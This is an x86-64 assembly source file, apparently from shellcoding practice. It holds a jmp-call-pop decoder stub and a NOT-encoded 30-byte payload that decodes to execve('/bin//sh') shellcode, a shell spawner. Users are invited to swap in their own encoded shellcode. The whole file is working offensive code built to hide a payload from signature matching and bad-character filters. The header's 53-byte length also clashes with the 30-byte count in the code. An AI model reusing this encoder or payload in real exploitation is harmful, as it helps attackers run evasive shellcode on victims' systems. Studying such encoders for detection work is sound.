; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com
;
; Description : The code decodes whatever is present in 'encoded_shellcode' label. User just need
;				to add comma separated values to the label 'encoded_shellcode' and the lenght of
;				shellcode.
; 
; SHELLCODE LENGTH = 53 Bytes 


global _start


section .text
_start:
	
	jmp PushShellcodeAddress	


Main:
	pop rbx
	xor rcx, rcx			; Zero out RCX
	add	rcx, 30				; Size of Encoded shellcode

decode:
	not byte [rbx + rcx - 0x1]
	loop decode

	jmp	encoded_shellcode	; Jump to the decoded shellcode


PushShellcodeAddress:

	call Main
	encoded_shellcode:	db 0xb7,0xce,0x3f,0xaf,0xb7,0x44,0xd0,0x9d,0x96,0x91,0xd0,0xd0,0x8c,0x97,0xac,0xb7,0x76,0x18,0xaf,0xb7,0x76,0x1d,0xa8,0xb7,0x76,0x19,0x4f,0xc4,0xf0,0xfa
